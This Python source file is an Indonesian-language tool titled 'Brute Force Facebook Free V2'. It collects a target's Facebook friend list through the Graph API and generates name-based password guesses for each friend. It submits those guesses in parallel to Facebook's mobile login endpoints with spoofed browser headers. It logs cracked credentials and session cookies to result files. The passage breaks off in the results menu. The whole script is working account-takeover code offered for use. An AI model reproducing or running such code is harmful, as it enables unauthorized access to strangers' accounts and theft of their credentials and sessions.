import os
import re
import bs4
import sys
import json
import rich
import time
import random
import datetime
import requests

from concurrent.futures import ThreadPoolExecutor as Trd
from time import sleep, strftime
from rich.console import Console
from rich.columns import Columns
from rich import print as Cetak
from rich.tree import Tree
from rich.panel import Panel
from random import choice as rc
from random import randint as rr
from random import randrange as rg
from rich.progress import Progress
from rich.progress import SpinnerColumn
from rich.progress import TextColumn
from rich.progress import BarColumn
from rich.progress import TimeElapsedColumn

(
	ok,
	cp,
	loop,
	id,
	id2,
	pwp,
	pwt
)   =   (
	0,
	0,
	0,
	[],
	[],
	[],
	[]
	)
(
	P,
	M,
	K,
	B,
	H,
	N
)   =   (
	'\x1b[1;97m',
	'\x1b[1;91m',
	'\x1b[1;93m',
	'\x1b[1;94m',
	'\x1b[1;92m',
	'\x1b[0m'
)
sys.stdout.write(
	'\x1b]2; Simple BF Facebook V2\x07'
)
now = datetime.datetime.now(
	)
if    3 <= now.hour < 12: 
	sapa = "Pagi"
elif 12 <= now.hour < 15: 
	sapa = "Siang"
elif 15 <= now.hour < 18: 
	sapa = "Sore"
else:
	sapa = "Malam"
dta = {
	'1':'Jan',
	'2':'Feb',
	'3':'Mar',
	'4':'Apr',
	'5':'Mei',
	'6':'Jun',
	'7':'Jul',
	'8':'Agu',
	'9':'Sepr',
	'10':'Okt',
	'11':'Nov',
	'12':'Des'
	}
dtb = {
	'1':'Januari',
	'2':'Februari',
	'3':'Maret',
	'4':'April',
	'5':'Mei',
	'6':'Juni',
	'7':'Juli',
	'8':'Agustus',
	'9':'September',
	'10':'Oktober',
	'11':'November',
	'12':'Desember'
	}
dth = {
	'Monday':'Senin',
	'Tuesday':'Selasa',
	'Wednesday':'Rabu',
	'Thursday':'Kamis',
	'Friday':'Jumat',
	'Saturday':'Sabtu',
	'Sunday':'Minggu'
	}
tgl = now.day
mon = dta[
	(
		str(
			now.month
		)
	)
]
bln = dtb[
	(
		str(
			now.month
		)
	)
]
thn = now.year
day = dth[
	(
		str(
			strftime(
				"%A"
			)
		)
	)
]
jam = now.strftime(
	"%I"
	)
mnt = now.strftime(
	"%M"
	)
dtk = now.strftime(
	"%S"
	)
wkt = (
		'%s,%s-%s-%s,%s:%s:%s,%s'
		%
		(
		day,
		tgl,
		bln,
		thn,
		jam,
		mnt,
		dtk,
		sapa
		)
	)
okc = (
	'OK-'
	+
	str(tgl)
	+
	'-'
	+
	str(mon)
	+
	'-'
	+
	str(thn)
	+
	'.txt'
	)
cpc = (
	'CP-'
	+
	str(tgl)
	+
	'-'
	+
	str(mon)
	+
	'-'
	+
	str(thn)
	+
	'.txt'
	)
try:
	prox = requests.get(
		'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'
	).text 
	open(
		'p.txt','w'
	).write(
		prox
	)
except Exception as e:
	Console(width=48).print(
		Panel(
			"[bold purple]* [bold #FF00D4]error 404, jaringan lemot![bold purple] *",
			width=48,
			style=f"bold purple",
			),
		justify="center",
		)
	exit(
	)
def Bersih():
	os.system(
		"cls"
		if os.name == "nt"
		else "clear"
	)
def Back_Menu():
	Main_Menu(
	)
def Banner():
	Bersih(
	)
	Console(width=48).print(
		Panel(
			'''[bold #FF00D4] ⠀⠀⠀⠀⠀⠀⢁⣴⣶⣶⣤⣀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠒⣠⣶⣶⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⢀⡜⣽⣃⣿⣿⣿⣿⣿⣦⡀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⠈⢻⣦⠀⠠⡀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⣰⠋⣰⠇⣸⡟⠙⢻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⠀⢀⣿⣷⡀⠘⢆⠀⠀⠀⠀\n⠀ ⠀⣰⠃⣴⡏⢀⣿⠁⠀⠀⠙⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡿⠋⢸⡇⠀⣿⣿⣷⡀⠀⠳⡀⠀⠀\n ⠀⢠⠏⣴⡿⠀⣾⡏⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣷⣤⣤⣤⣤⣾⣿⣿⣿⠋⠀⠀⠈⣇⠀⠘⣿⣿⣷⡀⠀⠹⡄⠀\n ⠀⣿⠏⢸⣗⣼⡿⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣷⣄⠀⠀⠀⢹⡀⠀⠻⣿⣿⣷⡀⠀⠸⡀\n ⢸⠇⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⣤⣼⣟⢋⡬⣽⡟⣟⡛⢿⢿⡛⠻⡿⠿⣿⣦⠀⠀⠈⣧⠀⠀⢻⣿⣿⣿⡄⠀⢇\n ⣿⣶⣾⣿⣿⠃⠀⠀⠀⠀⢀⣞⡟⣯⣴⣾⣿⠃⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠸⣇⠀⢉⣽⣿⣿⣿⡄⠈\n ⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⡼⣞⣾⢿⣿⣿⡏⠀⣿⣿⡏⣿⣿⢻⣿⣿⣿⣿⣿⣿⡇⠀⢀⡙⣆⠀⠠⣾⣿⣿⣷⠀\n ⠹⠿⠿⠋⠀⠀⠀⠀⠀⢰⡿⣹⡏⡿⣽⡿⠀⠀⠈⣟⣯⢿⣿⠀⠛⠿⣿⣿⣿⣿⣿⡀⠀⠀⠘⢷⣄⣨⣿⣿⠟⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠃⣿⣿⣇⣿⣡⣴⣶⠐⠭⣿⡇⡟⣿⣿⠟⢾⡏⢿⣿⣿⣿⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀\n ⠂⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⡿⣿⣿⣿⠁⠛⠛⠀⠟⠿⣹⠁⠀⠁⢠⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⣿⣿⣿⣏⠀⠀⠀⠀⠀⠇⠀⠀⠀⣣⢿⣯⢾⣿⡿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢠⢿⣿⣿⣾⡀⠀⠀⠈⠉⠀⠀⠀⠀⣠⡿⣿⣾⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣾⠘⣿⣿⣿⣦⣄⣀⠀⠀⣀⡴⠞⣿⣁⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣬⣿⣿⣿⣿⣿⣿⡛⠋⠁⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⣿⣿⣿⠿⢿⢿⢻⣅⠈⠳⠤⣀⡀⠾⣿⡛⣿⣟⡿⠿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣇⡟⠉⠀⠀⠈⢿⣾⣧⣷⡀⢰⣾⣽⣷⣿⣿⠟⣿⡏⠁⠈⢻⣷⢣⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣯⣿⠁⠀⠀⠀⠀⠈⢹⡿⣏⡌⠄⢻⡏⠀⠏⠋⠀⠞⣫⡃⠀⠈⣿⣯⢇⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⢠⡀⢊⡾⠆⠄⠂⠀⠀⠀⠀⠀⠀⡳⡡⢧⡀⣿⣿⣾⡄⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣰⡿⣿⣿⠀⠀⠀⠀⠀⢰⠁⠀⢺⣲⡓⡀ ⠀⠀⢄⠀⠀⠕⣖⡇⢈⣼⣿⡜⣷⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⣿⡇⣿⣿⡀⠀⠀⠀⠀⠘⠀⢀⡼⣿⡿⢭⡂⠀⠀ ⠳⡀⠁⣸⣿⣋⠈⣿⣿⠹⡇⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⡿⣿⣿⠻⡇⠀⠀⠀⠀⠀⠀⣼⠀⢛⣧⠅⡏⠳⣦ ⡀⢃⣰⣟⠻⡆⠀⣼⣿⣧⣷⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⢸⠃⢻⡏⢸⣷⠀⠀⠀⠀⠀⣸⡇⠀⠀⠻⢿⡅⠀⣶⣿⣶⣴⣿⣤⣽⣾⣾⣿⣿⡟⣿⡀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠘⡆⠸⣧⣼⢹⡆⠀⠀⠀⠀⣿⣿⣦⣤⣸⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠰⠃⠀⢻⡏⣼⣷⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡇⠘⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠂⠀⠀⢰⣿⣿⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⡿⣧⣿⣹⡇⠀⡇⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⣰⣯⡾⢣⣿⣿⡀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢸⡇⣿⠇⣿⠁⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⢀⣠⠾⠛⠁⢠⡿⡿⣿⠇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠈⡇⠋⠀⡯⣀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠈⡆⠀⠀⠔⠋⣼⣿⣿⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⡇⠀⠀⠀⠀⠁⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⠀⠁⢀⣠⡴⣻⣿⣿⣿⡆⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⡿⠁⡇⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⠀⠀⠀⣠⠖⠋⠉⠉⠙⢿⣿⣿⡇⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡿⠁⠀⢰⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀ ⠀⠀⡤⠊⠀⠀⠀⠠⠀ ⠀⠈⢻⣿⣿⠀⠀⠀⠸⣿⣿⣿⣿⣟⣾⠷⣄⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀\n ⠀⡠⠊⡀⠀⠀⠠⠈⠀⠀ ⠀⠀⠈⣿⣿⡆⠀⠀⠀⣿⣿⣿⣿⠟⠁⠀⠙⡆⠀⡇⠀⠠⠁⠀         \n[bold purple]╭──────────────────────────────────────────╮\n│[bold #FF00D4] Brute Force Facebook Free V2 by Danz.YOUR [bold purple]│\n╰──────────────────────────────────────────╯''',
			width=48,
			title="[bold #545B5B][ [bold #FF0000]● [bold #FFFF00]● [bold #00FF00]●[bold #545B5B] ]",
			title_align="left",
			subtitle=f"[bold #FF00D4]* <[bold purple][underline]{wkt}[bold #FF00D4][/underline]> *",
			style=f"bold purple",
		)
	)
def Main_Menu():
	Bersih(
		)
	Banner(
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]input menu (1/2)",
			style="bold purple",
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]1.dump friendlist    2.cek hasil ok cp",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
	)
	Pilih = Console().input(
		"[bold purple]   ╰─> "
	)
	if Pilih in ("1"):
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]input id target",
				width=48,
				subtitle="╭──",
				subtitle_align="left",
				style="bold purple",
				),
			justify="center"
		)
		idt = Console().input(
			"[bold purple]   ╰─> "
			)
		Start_Dump(idt, "", {"cookie": cok}, token)
		Sortir_Idz(
		)
	elif Pilih in ("2"):
		Hasil_OkCp(
		)
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]macam tak betul budek ni",
				width=48,
				style="bold purple",
				),
			justify="center"
		)
	sleep(
		2
		)
	exit(
	)
def Start_Dump(idt, fields, cookie, token):
	ses = requests.Session()
	try:
		head = {
			"connection": "keep-alive",
			"accept": "*/*",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9",
			}
		if len(id) == 0:
			param = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)",
			}
		else:
			param = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})",
			}
		url = ses.get(
			f"https://graph.facebook.com/{idt}",
			params=param,
			headers=head,
			cookies=cookie,
		).json()
		for i in url["friends"]["data"]:
			id.append(i["id"] + "|" + i["name"])
			print(f"       ╰─> sedang mengumpulkan {len(id)} id         ",end="\r")
		Start_Dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
	except :
		pass
def Sortir_Idz():
	if len(id) == 0:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]id privat/ttl -18th",
				style="bold purple",
				),
			justify="center"
			)
		exit(
		)
	muda = [
]
	for bacot in sorted(id):
		muda.append(
			bacot
		)
	bcm = len(
		muda
	)
	bcmi = (
		bcm-1
		)
	for xmud in range(bcm):
		id2.append(
			muda[
				bcmi
			]
		)
		bcmi -=1
	Console(width=48).print(
		Panel(
			f"[bold #FF00D4]terkumpul {len(id)} id",
			style="bold purple",
			),
		justify="center"
		)
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]tambah kata sandi (y/t)",
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple",
			),
		justify="center"
		)
	pwa = Console().input(
		"[bold purple]   ╰─> "
		)
	if pwa in ["y", "Y"]:
		pwp.append(
			"bade"
			)
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]example: password,facebook,rahasia",
				width=48,
				subtitle="╭──",
				subtitle_align="left",
				style="bold purple",
				),
			justify="center"
			)
		pwn = Console().input(
			"[bold purple]   ╰─> "
			)
		pwk = pwn.split(
			","
			)
		for xpw in pwk:
			pwt.append(
				xpw
			)
	else:
		pwp.append(
			"moal"
		)
	Eksekusi(
	)
def Eksekusi():
	global prog, des
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]mode pesawat per 300 id",
			width=48,
			subtitle="[bold #FF00D4]* <[bold purple][underline]hasil akun ok dan cp tersimpan di[/underline][bold #FF00D4]> *",
			style="bold purple",
			),
		justify="center"
	)
	Colom2 = [
]
	Colom2.append(
		Panel(
			f"[bold #00FF00] {okc}",
			width=23,
			style="bold purple",
		)
	)
	Colom2.append(
		Panel(
			f"[bold #FFFF00] {cpc}",
			width=24,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom2
			),
		justify="center"
	)
	prog = Progress(
		SpinnerColumn(
			'clock'
		),
		TimeElapsedColumn(
		),
		TextColumn(
			'{task.percentage:.0f}%'
		),
		TextColumn(
			'{task.description}'
		),
		# BarColumn(
		# )
	)
	des = prog.add_task(
		'',
		total = len(
			id2
		)
	)
	with prog:
		with Trd(max_workers=30) as MethodCrack:
			for mxv in id2:
				user = mxv.split(
					'|'
					)[
					0
				]
				nmfl = mxv.split(
					'|'
					)[
					1
				].lower()
				namd = nmfl.split(
					' '
					)[
					0
				]
				namx = nmfl.replace(
					' ',
					''
				)
				pasw = [
					'kamu nanya',
					'kamunanya',
					'kata sandi'
				]
				if len(nmfl) and len(namx) < 6:
					if len(namd) < 3:
						pass
					else:
						pasw.append(
							nmfl
						)
						pasw.append(
							namx
						)
						pasw.append(
							namd
							+
							namd
						)
						pasw.append(
							namd
							+
							' '
							+
							namd
						)
						pasw.append(
							namd
							+
							'@1'
						)
						pasw.append(
							namd
							+
							'1'
						)
						pasw.append(
							namd
							+
							'01'
						)
						pasw.append(
							namd
							+
							'02'
						)
						pasw.append(
							namd
							+
							'03'
						)	
						pasw.append(
							namd
							+
							'04'
						)
						pasw.append(
							namd
							+
							'05'
						)	
						pasw.append(
							namd
							+
							'06'
						)	
						pasw.append(
							namd
							+
							'07'
						)	
						pasw.append(
							namd
							+
							'08'
						)	
						pasw.append(
							namd
							+
							'09'
						)	
						pasw.append(
							namd
							+
							'12'
						)	
						pasw.append(
							namd
							+
							'321'
						)	
						pasw.append(
							namd
							+
							'4321'
						)
				else:
					if len(namd) < 3:
						pasw.append(
							nmfl
							)
						pasw.append(
							namx
						)
					else:
						pasw.append(
							nmfl
							)
						pasw.append(
							namx
						)
						pasw.append(
							namd
							+
							namd
						)
						pasw.append(
							namd
							+
							' '
							+
							namd
						)
						pasw.append(
							namd
							+
							'12'
						)
						pasw.append(
							namd
							+
							'123'
						)
						pasw.append(
							namd
							+
							'1234'
						)
						pasw.append(
							namd
							+
							'12345'
						)
						pasw.append(
							namd
							+
							'123456'
						)
				if 'bade' in pwp:
					for xpwd in pwt:
						pasw.append(
							xpwd
						)
				else:
					pass
				MethodCrack.submit(
					Valid,
					user,
					pasw,
					nmfl
				)
		print(
		)
	Console(width=48).print(
		Panel(
			f'[bold #FF00D4]crack selesai akun ok: [bold #00FF00]{ok} [bold #FF00D4]akun cp: [bold #FFFF00]{cp}',
			width=48,
			style=f"bold purple"
			),
		justify="center"
		)
	exit(
	)
def Konversi(cookie):
	kueh = (
		'datr=%s;sb=%s;ps_l=0;ps_n=0;c_user=%s;xs=%s;fr=%s'
		%
		(
			cookie[
				'datr'
			],
			cookie[
				'sb'
			],
			cookie[
				'c_user'
			],
			cookie[
				'xs'
			],
			cookie[
				'fr'
			]
		)
	)
	return(
		str(
			kueh
		)
	)
def Valid(user,pasw,nmfl):
	global loop,ok,cp
	prog.update(des,description=f"[bold #FF00D4]{loop}[bold #FFFFFF]=[bold #FF00D4]{len(id)} [bold ##FFFFFF]{user} [bold #FFFFFF]ok:[bold #80FF00]{ok}[bold #FFFFFF] cp:[bold #FFFF00]{cp}[/]")
	prog.advance(des)
	for pw in pasw:
		try:
			ses = requests.Session(); ua = User_Agent()
			# xxx = open('p.txt','r').read().splitlines()
			# zzz = {'http': 'socks5://'+random.choice(xxx)}
			url = (f'{rc(["free","mbasic","m"])}.prod.facebook.com')
			bhs = rc(['id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'bd-BD,bd;q=0.9,en-US;q=0.8,en;q=0.7', 'en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7', 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'])
			link = ses.get("https://"+url+"/login.php?skip_api_login=1&api_key=285562428300787&kid_directed_site=0&app_id=285562428300787&signed_next=1&next=https%3A%2F%2F"+url+"%2Fv5.0%2Fdialog%2Foauth%3Fapp_id%3D285562428300787%26cbt%3D1709452496918%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfe2e12d59af8fed29%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%26client_id%3D285562428300787%26display%3Dtouch%26domain%3Dwww.jamtangan.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Flogin%26locale%3Den_US%26logger_id%3Df48b37a2e1119e20c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dff857ee30a26b211a%2526domain%253Dwww.jamtangan.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.jamtangan.com%25252Ff8a7fd5c976607552%2526relation%253Dopener%2526frame%253Dfb4ebd097bc939579%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv5.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dff857ee30a26b211a%26domain%3Dwww.jamtangan.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.jamtangan.com%252Ff8a7fd5c976607552%26relation%3Dopener%26frame%3Dfb4ebd097bc939579%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": user,
				"next": "https://"+url+"/login/save-device/",
				"flow": "login_no_pin",
				"pass": pw,}
			kueh = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			head = {
				'Host': url,
				'cache-control': 'max-age=0',
				'upgrade-insecure-requests': '1',
				'origin': 'https://'+url,
				'content-type': 'application/x-www-form-urlencoded',
				'x-requested-with': 'XMLHttpRequest',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'dpr': str(rr(1,5)),
				'viewport-width': str(rr(300,999)),
				'sec-ch-ua': '"Not)A;Brand";v="{}", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+)', str(ua)).group(1)),
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-ua-platform-version': '"{}.0.0"'.format(re.search(r'Android (\d+)', ua).group(1)),
				'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Chromium";v="{}"'.format(str(rr(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua)).group(1)),
				'sec-ch-prefers-color-scheme': 'dark',
				'referer': link.url,
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': bhs,}
			sign = ses.post('https://'+url+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',
				data = date,
				headers = head,
				cookies = {
					'cookie'
					:
					kueh
				},
				allow_redirects = False)
			if "checkpoint" in ses.cookies.get_dict():
				tree = Tree(
					"",
					guide_style="bold purple"
				)
				true = tree.add(
					Panel(
						"[bold #FFFF00]login akun facebook cekpoint",
						subtitle="* ᴅᴀᴛᴀ *",
						subtitle_align="left",
						width=32,
						style="bold purple"
					)
				).add(
					f"[bold #FFFF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"
					,style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ɴɴ: [#FFFFFF]{nmfl}",
					style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ɪᴅ: [#FFFFFF]{user}",
					style="bold purple"
				)
				true.add(
					f"[bold #FFFF00]ᴘᴡ: [#FFFFFF]{pw}",
					style="bold purple"
				)
				true = tree.add(
					Panel(
						f"[bold #FF00D4]{ua}",
						title="* ᴜɢᴇɴ *",
						title_align="left",
						width=84,style="bold purple"
					)
				)
				true.add(
					Panel(
						"[bold #FFFF00]silahkan check di lite/mbasic barangkali opsi checkpointnya dapat dibuka!",
						title="* ɪɴғᴏ *",
						title_align="left",
						width=80,
						style="bold purple"
					)
				)
				Cetak(
					tree
				)
				open(
					'CP/'
					+
					cpc,
					'a'
					).write(
					user
					+
					'|'
					+
					pw
					+
					'\n'
				)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				kuki = Konversi(
					ses.cookies.get_dict()
				)
				tree = Tree(
					"",
					guide_style="bold purple"
				)
				true = tree.add(
					Panel(
						"[bold #00FF00]login akun facebook berhasil",
						subtitle="* ᴅᴀᴛᴀ *",
						subtitle_align="left",
						width=32,
						style="bold purple"
					)
				).add(
					f"[bold #00FF00]ᴜʀʟᴡᴇʙ: [#FFFFFF]{url}"
					,style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ɴɴ: [#FFFFFF]{nmfl}",
					style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ɪᴅ: [#FFFFFF]{user}",
					style="bold purple"
				)
				true.add(
					f"[bold #00FF00]ᴘᴡ: [#FFFFFF]{pw}",
					style="bold purple"
				)
				true = tree.add(
					Panel(
						f"[bold #FF00D4]{ua}",
						title="* ᴜɢᴇɴ *",
						title_align="left",
						width=84,style="bold purple"
					)
				)
				true.add(
					Panel(
						f"[bold #00FF00]{kuki}",
						title="* ᴋᴜᴇʜ *",
						title_align="left",
						width=80,
						style="bold purple"
					)
				)
				Cetak(
					tree
				)
				open(
					'OK/'
					+
					okc,
					'a'
					).write(
					user
					+
					'|'
					+
					pw
					+
					'|'
					+
					kuki
					+
					'|'
					+
					ua
					+
					'\n'
				)
				ok+=1
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(30)
	loop +=1
def Hasil_OkCp():
	Colom3 = [
	]
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]menu cek hasil crack",
			style="bold purple",
			),
		justify="center"
		)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 1.hasil ok",
			width=15,
			style="bold purple",
		)
	)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 2.hasil cp",
			width=16,
			style="bold purple",
		)
	)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 3.kembali",
			width=15,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom3
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			'[bold #FF00D4]input menu (1/2/3)',
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple"
			),
		justify="center"
	)
	Choose = Console().input(
		'[bold purple]   ╰─> '
		)
	if Choose in ('1'):
		try:
			Cari = os.listdir(
				'OK'
			)
		except FileNotFoundError:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file tidak ada",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				3
				)
			Back_Menu(
			)
		if len(Cari) == 0:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file kosong, crack dahulu",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				2
				)
			Back_Menu(
			)
		else:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]daftar hasil akun ok anda",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			Htg = 0
			Fns = {}
			for Data in Cari:
				try:
					Isi = open('OK/'+Data,'r').readlines()
				except:
					continue
				Htg+=1
				if Htg < 10:
					Nom = (
						''
						+
						str(
							Htg
						)
					)
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Fns.update(
						{
							Nom
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]0'
						+
						Nom
						+
						'[#FFFFFF]. '
						+
						Data
						+
						'[bold #00FF00] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
				else:
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]'
						+
						str(
							Htg
						)
						+
						'. '
						+
						Data
						+
						'[bold #00FF00] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]input nomer daftar hasil diatas",
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			View = Console().input(
				'[bold purple]   ╰─> '
				)
			try:
				Liat = Fns[
					View
				]
			except KeyError:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]macam tak betul budek ni",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			try:
				Cari2 = open(
					'OK/'
					+
					Liat,
					'r'
				).read().splitlines()
			except:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]file tidak ada",
